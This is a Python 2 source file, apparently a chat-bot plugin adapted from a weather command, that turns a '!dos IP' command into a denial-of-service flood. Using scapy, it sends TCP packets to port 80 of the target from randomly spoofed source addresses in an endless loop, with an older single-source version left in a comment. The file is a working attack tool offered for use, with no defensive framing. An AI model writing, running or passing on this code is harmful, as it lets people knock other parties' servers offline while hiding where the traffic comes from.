# -*- coding: utf-8 -*-
import random
from scapy.all import *
import sys

def dos(components): # !dos <city> or !dos <city>, <state or country>
    '''Returns a string containing the dos result from a target'''

    response = ''
    result = ''

    try:
        print components
        target = components['arguments'].split('!dos ')[1]
        print "Target:", target
        target = target.lstrip()

        if len(target) < 1:
            raise Exception('Empty IP!')
       
        else:
            target = target.replace(' ', '')
            result = do_dos(target)
            if type(result) == type(str()):
                response = result
            else:
                response = result['target'] + ' - ' + result['temp'] + \
                        ' - ' + result['dos'] + ' - Provided by: ' + \
                        'dos Underground, Inc.'

        return response.encode('utf8')
    except:
        response = 'Usage: !dos IP'
        print "Exception - If a broken pipe caused this then you probably knocked it over!"
        return "Exception"

'''
from scapy.all import *
 
src = raw_input("Enter the Source IP ")
target = raw_input("Enter the Target IP ")
 
i=1
while True:
for srcport in range(1,65535):
   IP1 = IP(src=src, dst=target)
   TCP1 = TCP(sport=srcport, dport=80)
   pkt = IP1 / TCP1
   send(pkt,inter= .0001)
   print "packet sent ", i
   i=i+1
'''


def do_dos(target):
    #target = raw_input("Enter the Target IP ")
    dot = "."
    i=1
    while True:
        a = str(random.randint(1,254))
        b = str(random.randint(1,254))
        c = str(random.randint(1,254))
        d = str(random.randint(1,254))
        src = a+dot+b+dot+c+dot+d
        #print src
        st = random.randint(1,1000)
        en = random.randint(1000,65535)
        loop_break = 0
        for srcport in range(st,en):
            IP1 = IP(src=src, dst=target)
            TCP1 = TCP(sport=srcport, dport=80)
            pkt = IP1 / TCP1
            #send(pkt,inter= .0001)
            try:
                send(pkt)
            except:
                print "Exception: Send Packet"
                continue
            #sys.stdout.write( '.' )
            #sys.stdout.flush()
            #print "packet sent ", i
            loop_break += 1
            i=i+1
            if loop_break ==50 :
                break
    return 'done'

if "__main__"==__name__:
    target= raw_input("What is the target IP? ")
    dos({"arguments":"!dos "+ target})


